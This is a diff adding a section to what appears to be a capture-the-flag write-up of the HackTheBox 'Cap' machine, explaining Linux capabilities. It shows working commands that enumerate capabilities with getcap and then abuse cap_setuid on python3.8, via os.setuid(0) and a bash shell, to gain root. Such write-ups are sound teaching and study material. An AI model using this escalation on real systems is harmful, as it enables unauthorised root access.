@@ -360,3 +360,40 @@ nathan@cap:~$ find / -perm /4000 2>/dev/null
 ```
 
 However - even with the help of [GTFOBins](https://gtfobins.github.io/#+suid) - I had no luck in doing anything.
+
+### Exploiting Linux Capabilities
+I didn't really know what to do after SUID privesc failed. It is then that I found out from the chirping of a bird called ["Cap writeup"](https://medium.com/@sudharshank/hackthebox-cap-walkthrough-69d5d2facc7a) (what a silly name for a bird!) that it had to do something with [linux capabilities](https://linuxconfig.org/introduction-to-linux-capabilities).
+
+Linux capabilities are essentially granular permissions a process is given, so that it can do what it is supposed to do without becoming full root.
+
+I scanned the system for any interesting linux capabilities:
+```bash
+nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+`cap_setuid` is a very powerfull capability, allowing the process to execute the [setuid syscall](https://www.man7.org/linux/man-pages/man2/setuid.2.html), which changes the process id to any on the system (including root).
+
+From my understanding, this capability is normally given to binaries so they can lower their privilege in order run dangerous-if-privileged commands with the proper restrictions.
+
+Giving this capability to `/usr/bin/python3.8` allows me to become root. I only have to execute it, invoke the C setuid syscall through the [os module](https://docs.python.org/3/library/os.html) and spawn a bash shell( also found on [GTFOBins](https://gtfobins.github.io/gtfobins/python/)):
+
+```bash
+nathan@cap:/$ which python3.8
+/usr/bin/python3.8
+nathan@cap:/$ python3.8
+Python 3.8.5 (default, Jan 27 2021, 15:41:15)
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> os.setuid(0) # 0 uid -> root
+>>> os.system("/bin/bash")
+root@cap:/# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+```
+
+Owned!
